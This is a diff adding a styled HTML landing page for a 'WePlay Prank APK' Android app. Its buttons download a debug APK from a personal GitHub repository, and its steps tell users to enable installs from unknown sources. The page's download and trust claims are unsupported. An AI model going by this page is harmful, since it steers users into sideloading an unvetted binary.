@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>WePlay — Prank APK | Next-Gen Fun</title>
+<meta name="description" content="Download WePlay Prank APK — the ultimate futuristic prank toolkit." />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Space+Grotesk:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{
+    --bg:#03040a;
+    --cyan:#00e5ff;
+    --purple:#9d4edd;
+    --pink:#ff2e88;
+    --text:#eaf6ff;
+    --muted:#8ea3b8;
+    --stroke:rgba(255,255,255,.09);
+  }
+  html{scroll-behavior:smooth}
+  body{
+    background:var(--bg);
+    color:var(--text);
+    font-family:'Space Grotesk',system-ui,-apple-system,sans-serif;
+    overflow-x:hidden;
+    min-height:100vh;
+    -webkit-font-smoothing:antialiased;
+    position:relative;
+  }
+
+  /* ---------- STATIC BACKGROUND ---------- */
+  body::before{
+    content:"";position:fixed;inset:0;z-index:-3;pointer-events:none;
+    background-image:
+      linear-gradient(rgba(0,229,255,.055) 1px,transparent 1px),
+      linear-gradient(90deg,rgba(0,229,255,.055) 1px,transparent 1px);
+    background-size:64px 64px;
+    -webkit-mask-image:radial-gradient(ellipse 90% 70% at 50% 0%,#000 20%,transparent 82%);
+    mask-image:radial-gradient(ellipse 90% 70% at 50% 0%,#000 20%,transparent 82%);
+  }
+  body::after{
+    content:"";position:fixed;inset:0;z-index:-2;pointer-events:none;
+    background:
+      radial-gradient(circle 620px at 8% -6%,rgba(0,229,255,.20),transparent 60%),
+      radial-gradient(circle 700px at 96% 26%,rgba(157,78,221,.20),transparent 62%),
+      radial-gradient(circle 560px at 42% 108%,rgba(255,46,136,.14),transparent 60%),
+      radial-gradient(ellipse at 50% 40%,transparent 45%,rgba(0,0,0,.72) 100%);
+  }
+
+  /* ---------- NAV ---------- */
+  nav{
+    position:fixed;top:0;left:0;right:0;z-index:100;
+    display:flex;align-items:center;justify-content:space-between;
+    padding:16px clamp(20px,5vw,64px);
+    backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
+    background:rgba(3,4,10,.62);
+    border-bottom:1px solid rgba(0,229,255,.14);
+  }
+  .logo{
+    display:flex;align-items:center;gap:12px;
+    font-family:'Orbitron',sans-serif;font-weight:900;font-size:1.15rem;letter-spacing:.18em;
+  }
+  .logo-mark{
+    width:36px;height:36px;border-radius:11px;flex:none;
+    background:linear-gradient(135deg,var(--cyan),var(--purple));
+    box-shadow:0 0 22px rgba(0,229,255,.55),0 0 40px rgba(157,78,221,.3);
+    display:grid;place-items:center;
+    font-size:.85rem;color:#03040a;
+  }
+  .logo span{
+    background:linear-gradient(90deg,#fff,var(--cyan));
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+  }
+  .nav-links{display:flex;gap:32px;align-items:center}
+  .nav-links a{
+    color:var(--muted);text-decoration:none;font-size:.8rem;font-weight:500;
+    letter-spacing:.14em;text-transform:uppercase;transition:color .25s;position:relative;
+  }
+  .nav-links a:hover{color:var(--cyan)}
+  .nav-links a::after{
+    content:"";position:absolute;left:0;bottom:-7px;height:1px;width:0;
+    background:var(--cyan);box-shadow:0 0 8px var(--cyan);transition:width .3s;
+  }
+  .nav-links a:hover::after{width:100%}
+  @media(max-width:760px){.nav-links{display:none}}
+
+  /* ---------- HERO ---------- */
+  header{
+    min-height:100vh;display:flex;flex-direction:column;
+    align-items:center;justify-content:center;text-align:center;
+    padding:140px clamp(20px,5vw,40px) 90px;position:relative;
+  }
+  header::before,
+  header::after{
+    content:"";position:absolute;width:1px;top:20%;height:60%;
+    background:linear-gradient(180deg,transparent,rgba(0,229,255,.5),transparent);
+  }
+  header::before{left:clamp(8px,4vw,60px)}
+  header::after{right:clamp(8px,4vw,60px)}
+
+  .badge{
+    display:inline-flex;align-items:center;gap:10px;
+    padding:9px 20px;border-radius:100px;
+    border:1px solid rgba(0,229,255,.4);
+    background:rgba(0,229,255,.07);
+    font-size:.7rem;letter-spacing:.24em;text-transform:uppercase;font-weight:700;
+    color:var(--cyan);margin-bottom:34px;
+    box-shadow:0 0 28px rgba(0,229,255,.2) inset,0 0 26px rgba(0,229,255,.16);
+  }
+  .dot{
+    width:7px;height:7px;border-radius:50%;background:var(--cyan);
+    box-shadow:0 0 12px var(--cyan);
+  }
+
+  h1{
+    font-family:'Orbitron',sans-serif;font-weight:900;
+    font-size:clamp(2.7rem,8.5vw,6.6rem);
+    line-height:.96;letter-spacing:-.02em;text-transform:uppercase;
+  }
+  h1 .grad{
+    background:linear-gradient(100deg,var(--cyan) 0%,#a78bfa 48%,var(--pink) 100%);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+    filter:drop-shadow(0 0 38px rgba(0,229,255,.42));
+    display:block;
+  }
+  h1 .outline{
+    color:transparent;-webkit-text-stroke:1.8px rgba(234,246,255,.5);
+    display:block;
+  }
+
+  .sub{
+    max-width:640px;margin:30px auto 0;color:var(--muted);
+    font-size:clamp(1rem,2vw,1.15rem);line-height:1.75;font-weight:300;
+  }
+  .sub b{color:var(--text);font-weight:600}
+
+  /* ---------- DOWNLOAD BUTTON ---------- */
+  .cta-wrap{margin-top:52px;display:flex;gap:18px;flex-wrap:wrap;justify-content:center}
+  .btn-dl{
+    position:relative;display:inline-flex;align-items:center;gap:14px;
+    padding:22px 52px;border:none;border-radius:70px;cursor:pointer;
+    font-family:'Orbitron',sans-serif;font-weight:800;
+    font-size:clamp(.82rem,1.6vw,1rem);letter-spacing:.14em;text-transform:uppercase;
+    color:#03040a;overflow:hidden;
+    background:linear-gradient(100deg,var(--cyan),#7cf7ff 40%,#b98cff 74%,var(--pink));
+    box-shadow:
+      0 0 36px rgba(0,229,255,.5),
+      0 0 100px rgba(157,78,221,.32),
+      0 16px 44px rgba(0,0,0,.6),
+      inset 0 0 0 1px rgba(255,255,255,.4);
+    transition:transform .28s cubic-bezier(.2,.9,.3,1.3),box-shadow .3s,filter .3s;
+  }
+  .btn-dl:hover{
+    transform:translateY(-4px) scale(1.03);
+    box-shadow:
+      0 0 64px rgba(0,229,255,.85),
+      0 0 150px rgba(157,78,221,.55),
+      0 20px 54px rgba(0,0,0,.65),
+      inset 0 0 0 1px rgba(255,255,255,.55);
+    filter:brightness(1.08);
+  }
+  .btn-dl:active{transform:translateY(-1px) scale(.99)}
+  .btn-dl svg{width:20px;height:20px;flex:none;position:relative;z-index:2}
+  .btn-dl span{position:relative;z-index:2}
+  .btn-dl.loading{pointer-events:none;opacity:.85}
+  .btn-dl.loading svg{animation:spin .9s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  .btn-ghost{
+    display:inline-flex;align-items:center;gap:10px;
+    padding:22px 40px;border-radius:70px;cursor:pointer;
+    font-family:'Orbitron',sans-serif;font-weight:700;font-size:.82rem;letter-spacing:.14em;
+    text-transform:uppercase;text-decoration:none;
+    color:var(--text);background:rgba(255,255,255,.035);
+    border:1px solid var(--stroke);backdrop-filter:blur(10px);
+    transition:.3s;
+  }
+  .btn-ghost:hover{
+    border-color:rgba(0,229,255,.65);color:var(--cyan);
+    box-shadow:0 0 32px rgba(0,229,255,.25);transform:translateY(-3px);
+  }
+
+  .meta-note{
+    margin-top:26px;font-size:.76rem;color:#5d7386;
+    letter-spacing:.16em;text-transform:uppercase;
+  }
+
+  /* ---------- STATS ---------- */
+  .stats{
+    display:flex;gap:clamp(30px,7vw,90px);flex-wrap:wrap;justify-content:center;
+    margin-top:80px;
+  }
+  .stat{text-align:center;position:relative}
+  .stat + .stat::before{
+    content:"";position:absolute;left:calc(-1 * clamp(15px,3.5vw,45px));top:12%;
+    width:1px;height:76%;background:linear-gradient(180deg,transparent,rgba(0,229,255,.35),transparent);
+  }
+  .stat b{
+    display:block;font-family:'Orbitron',sans-serif;font-size:clamp(1.5rem,3.6vw,2.1rem);font-weight:900;
+    background:linear-gradient(180deg,#fff,var(--cyan));
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+  }
+  .stat small{color:var(--muted);font-size:.68rem;letter-spacing:.26em;text-transform:uppercase}
+
+  /* ---------- SECTIONS ---------- */
+  section{padding:clamp(90px,12vw,160px) clamp(20px,5vw,64px);position:relative;max-width:1240px;margin:0 auto}
+  .sec-head{text-align:center;margin-bottom:74px}
+  .sec-tag{
+    font-family:'Orbitron',sans-serif;font-size:.7rem;font-weight:700;
+    letter-spacing:.44em;text-transform:uppercase;color:var(--cyan);
+    display:block;margin-bottom:18px;
+  }
+  .sec-head h2{
+    font-family:'Orbitron',sans-serif;font-weight:800;
+    font-size:clamp(1.9rem,4.8vw,3.1rem);line-height:1.08;text-transform:uppercase;letter-spacing:-.01em;
+  }
+  .sec-head p{color:var(--muted);max-width:580px;margin:20px auto 0;line-height:1.75;font-weight:300}
+
+  /* ---------- FEATURE CARDS ---------- */
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(290px,1fr));gap:22px}
+  .card{
+    position:relative;padding:38px 32px;border-radius:20px;overflow:hidden;
+    background:linear-gradient(160deg,rgba(255,255,255,.06),rgba(255,255,255,.012));
+    border:1px solid var(--stroke);
+    backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+    transition:transform .35s cubic-bezier(.2,.9,.3,1.2),border-color .35s,box-shadow .35s;
+  }
+  .card::before{
+    content:"";position:absolute;top:0;left:0;right:0;height:1px;
+    background:linear-gradient(90deg,transparent,rgba(0,229,255,.6),transparent);
+    opacity:0;transition:opacity .35s;
+  }
+  .card:hover{
+    transform:translateY(-8px);
+    border-color:rgba(0,229,255,.45);
+    box-shadow:0 24px 64px rgba(0,0,0,.6),0 0 48px rgba(0,229,255,.16);
+  }
+  .card:hover::before{opacity:1}
+  .card .icon{
+    width:58px;height:58px;border-radius:16px;display:grid;place-items:center;
+    font-size:1.6rem;margin-bottom:24px;
+    background:linear-gradient(140deg,rgba(0,229,255,.18),rgba(157,78,221,.18));
+    border:1px solid rgba(0,229,255,.3);
+    box-shadow:0 0 28px rgba(0,229,255,.16) inset;
+  }
+  .card h3{
+    font-family:'Orbitron',sans-serif;font-size:1rem;font-weight:700;
+    letter-spacing:.07em;text-transform:uppercase;margin-bottom:13px;
+  }
+  .card p{color:var(--muted);font-size:.94rem;line-height:1.72;font-weight:300}
+
+  /* ---------- STEPS ---------- */
+  .steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:22px}
+  .step{
+    position:relative;padding:40px 30px;border-radius:20px;
+    background:linear-gradient(160deg,rgba(255,255,255,.055),rgba(255,255,255,.01));
+    border:1px solid var(--stroke);backdrop-filter:blur(14px);
+    transition:.35s;
+  }
+  .step:hover{
+    border-color:rgba(157,78,221,.55);transform:translateY(-6px);
+    box-shadow:0 0 48px rgba(157,78,221,.22);
+  }
+  .step .num{
+    font-family:'Orbitron',sans-serif;font-size:2.8rem;font-weight:900;line-height:1;
+    background:linear-gradient(180deg,var(--cyan),rgba(0,229,255,.05));
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+    margin-bottom:18px;display:block;
+  }
+  .step h4{
+    font-family:'Orbitron',sans-serif;font-size:.9rem;letter-spacing:.12em;
+    text-transform:uppercase;margin-bottom:11px;
+  }
+  .step p{color:var(--muted);font-size:.9rem;line-height:1.72;font-weight:300}
+  .step p b{color:var(--cyan);font-weight:600}
+
+  /* ---------- FINAL CTA ---------- */
+  .final{
+    position:relative;text-align:center;padding:clamp(64px,9vw,120px) clamp(24px,6vw,80px);
+    border-radius:32px;overflow:hidden;
+    background:linear-gradient(150deg,rgba(0,229,255,.10),rgba(157,78,221,.10),rgba(255,46,136,.07));
+    border:1px solid rgba(0,229,255,.24);
+    box-shadow:0 0 100px rgba(0,229,255,.10) inset,0 30px 80px rgba(0,0,0,.5);
+  }
+  .final::before{
+    content:"";position:absolute;width:640px;height:640px;border-radius:50%;
+    background:radial-gradient(circle,rgba(0,229,255,.20),transparent 65%);
+    top:-52%;left:50%;transform:translateX(-50%);pointer-events:none;
+  }
+  .final::after{
+    content:"";position:absolute;inset:0;pointer-events:none;
+    background-image:
+      linear-gradient(rgba(0,229,255,.06) 1px,transparent 1px),
+      linear-gradient(90deg,rgba(0,229,255,.06) 1px,transparent 1px);
+    background-size:44px 44px;
+    -webkit-mask-image:radial-gradient(ellipse 70% 70% at 50% 50%,#000,transparent 75%);
+    mask-image:radial-gradient(ellipse 70% 70% at 50% 50%,#000,transparent 75%);
+  }
+  .final h2{
+    font-family:'Orbitron',sans-serif;font-weight:900;
+    font-size:clamp(1.8rem,4.6vw,3.2rem);text-transform:uppercase;line-height:1.1;position:relative;z-index:2;
+  }
+  .final p{
+    color:var(--muted);margin:20px auto 44px;max-width:540px;
+    line-height:1.75;font-weight:300;position:relative;z-index:2;
+  }
+  .final .btn-dl{position:relative;z-index:2}
+
+  /* ---------- FOOTER ---------- */
+  footer{
+    border-top:1px solid rgba(255,255,255,.07);
+    padding:56px clamp(20px,5vw,64px) 44px;text-align:center;
+    background:linear-gradient(180deg,transparent,rgba(0,229,255,.04));
+  }
+  .foot-logo{
+    font-family:'Orbitron',sans-serif;font-weight:900;letter-spacing:.28em;font-size:1rem;
+    margin-bottom:18px;
+    background:linear-gradient(90deg,var(--cyan),var(--purple));
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+  }
+  footer p{color:#5d7386;font-size:.82rem;line-height:1.9;max-width:660px;margin:0 auto}
+  footer .disc{margin-top:20px;font-size:.72rem;color:#42525f}
+
+  /* ---------- TOAST ---------- */
+  .toast{
+    position:fixed;bottom:30px;left:50%;transform:translate(-50%,140%);
+    display:flex;align-items:center;gap:13px;
+    padding:16px 28px;border-radius:16px;z-index:999;
+    background:rgba(5,9,20,.95);backdrop-filter:blur(18px);
+    border:1px solid rgba(0,229,255,.45);
+    box-shadow:0 0 48px rgba(0,229,255,.34);
+    font-size:.88rem;font-weight:500;letter-spacing:.03em;
+    transition:transform .45s cubic-bezier(.2,.9,.3,1.3);
+    max-width:calc(100vw - 40px);
+  }
+  .toast.show{transform:translate(-50%,0)}
+  .toast .tick{
+    width:22px;height:22px;border-radius:50%;flex:none;display:grid;place-items:center;
+    background:linear-gradient(135deg,var(--cyan),var(--purple));
+    color:#03040a;font-size:.72rem;font-weight:900;
+  }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="logo">
+    <div class="logo-mark">▶</div>
+    <span>WEPLAY</span>
+  </div>
+  <div class="nav-links">
+    <a href="#features">Features</a>
+    <a href="#install">Install</a>
+    <a href="#download">Download</a>
+  </div>
+</nav>
+
+<!-- HERO -->
+<header>
+  <div class="badge"><span class="dot"></span> v2.0 · Latest Build Available</div>
+
+  <h1>
+    <span class="grad">WePlay</span>
+    <span class="outline">Prank Apk</span>
+  </h1>
+
+  <p class="sub">
+    The ultimate <b>futuristic prank toolkit</b> for Android. Fake screens, voice FX,
+    ghost calls and 20+ chaotic tricks — all in one ultra-light APK.
+  </p>
+
+  <div class="cta-wrap" id="download">
+    <button class="btn-dl" id="downloadBtn">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+        <polyline points="7 10 12 15 17 10"/>
+        <line x1="12" y1="15" x2="12" y2="3"/>
+      </svg>
+      <span id="btnLabel">Download APK</span>
+    </button>
+
+    <a href="#features" class="btn-ghost">Explore Features</a>
+  </div>
+
+  <p class="meta-note">Android 6.0+ · ~12 MB · 100% Free</p>
+
+  <div class="stats">
+    <div class="stat"><b>50K+</b><small>Downloads</small></div>
+    <div class="stat"><b>4.9★</b><small>User Rating</small></div>
+    <div class="stat"><b>25+</b><small>Prank Modes</small></div>
+    <div class="stat"><b>0</b><small>Ads</small></div>
+  </div>
+</header>
+
+<!-- FEATURES -->
+<section id="features">
+  <div class="sec-head">
+    <span class="sec-tag">// Capabilities</span>
+    <h2>Built For Chaos</h2>
+    <p>Every tool engineered with next-gen precision — smooth, fast and hilariously effective.</p>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="icon">🎭</div>
+      <h3>25+ Prank Modes</h3>
+      <p>Fake cracked screens, ghost typing, phantom notifications and prank callers — one tap away.</p>
+    </div>
+    <div class="card">
+      <div class="icon">🎙️</div>
+      <h3>Real-Time Voice FX</h3>
+      <p>Transform your voice into robot, alien, chipmunk or deep monster with studio-grade filters.</p>
+    </div>
+    <div class="card">
+      <div class="icon">📸</div>
+      <h3>Fake Screen Overlays</h3>
+      <p>Full-screen realistic overlays that mimic system crashes, updates and virus alerts.</p>
+    </div>
+    <div class="card">
+      <div class="icon">⚡</div>
+      <h3>Ultra Lightweight</h3>
+      <p>Only ~12 MB. No lag, no battery drain, optimized for every Android device.</p>
+    </div>
+    <div class="card">
+      <div class="icon">🔒</div>
+      <h3>Zero Ads · No Tracking</h3>
+      <p>Clean experience. No popups, no hidden permissions, no data collection. Ever.</p>
+    </div>
+    <div class="card">
+      <div class="icon">🚀</div>
+      <h3>Instant Updates</h3>
+      <p>New prank packs drop regularly. Direct GitHub releases mean you always get the newest build.</p>
+    </div>
+  </div>
+</section>
+
+<!-- INSTALL -->
+<section id="install">
+  <div class="sec-head">
+    <span class="sec-tag">// Deployment</span>
+    <h2>Install In 3 Steps</h2>
+    <p>Ready in under a minute — no root, no complicated setup.</p>
+  </div>
+
+  <div class="steps">
+    <div class="step">
+      <span class="num">01</span>
+      <h4>Download</h4>
+      <p>Tap the download button and grab the latest <b>WePlay.apk</b> straight from our GitHub release.</p>
+    </div>
+    <div class="step">
+      <span class="num">02</span>
+      <h4>Allow Install</h4>
+      <p>Open Settings → Security → enable <b>Install from Unknown Sources</b> for your browser or file manager.</p>
+    </div>
+    <div class="step">
+      <span class="num">03</span>
+      <h4>Launch & Prank</h4>
+      <p>Open the APK, install, and start exploring all 25+ prank modules. Enjoy the chaos.</p>
+    </div>
+  </div>
+</section>
+
+<!-- FINAL CTA -->
+<section>
+  <div class="final">
+    <h2>Ready To<br>Break Reality?</h2>
+    <p>Grab the latest WePlay Prank APK now and turn every moment into a masterpiece of mischief.</p>
+    <button class="btn-dl" id="downloadBtn2">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+        <polyline points="7 10 12 15 17 10"/>
+        <line x1="12" y1="15" x2="12" y2="3"/>
+      </svg>
+      <span>Download Now</span>
+    </button>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="foot-logo">WEPLAY</div>
+  <p>Futuristic prank toolkit for Android. Built for fun, designed for chaos.</p>
+  <p class="disc">
+    For entertainment purposes only. Please prank responsibly and always respect others.
+    <br>© <span id="yr"></span> WePlay. All rights reserved.
+  </p>
+</footer>
+
+<!-- TOAST -->
+<div class="toast" id="toast">
+  <div class="tick">✓</div>
+  <span id="toastMsg">Download started…</span>
+</div>
+
+<script>
+/* ============================================================
+   ⚙️  CONFIG — YOUR GITHUB APK LINK
+   ============================================================ */
+const CONFIG = {
+  apkUrl: "https://github.com/successstanvi/Prank/raw/refs/heads/main/Weplay%20Gift%20Prank-debug%20(1).apk",
+  fileName: "WePlay-Gift-Prank.apk"
+};
+/* ============================================================ */
+
+const toast    = document.getElementById('toast');
+const toastMsg = document.getElementById('toastMsg');
+const btns     = [document.getElementById('downloadBtn'), document.getElementById('downloadBtn2')];
+
+function showToast(msg){
+  toastMsg.textContent = msg;
+  toast.classList.add('show');
+  clearTimeout(showToast._t);
+  showToast._t = setTimeout(() => toast.classList.remove('show'), 3400);
+}
+
+function triggerDownload(btn){
+  const label = btn.querySelector('span');
+  const original = label ? label.textContent : '';
+  btn.classList.add('loading');
+  if (label) label.textContent = 'Preparing…';
+
+  const a = document.createElement('a');
+  a.href = CONFIG.apkUrl;
+  a.download = CONFIG.fileName;
+  a.rel = 'noopener';
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+
+  setTimeout(() => {
+    btn.classList.remove('loading');
+    if (label) label.textContent = original;
+    showToast('Download started — check your notifications');
+  }, 1500);
+}
+
+btns.forEach(btn => {
+  if (!btn) return;
+  btn.addEventListener('click', () => triggerDownload(btn));
+});
+
+/* ---------- Year ---------- */
+document.getElementById('yr').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
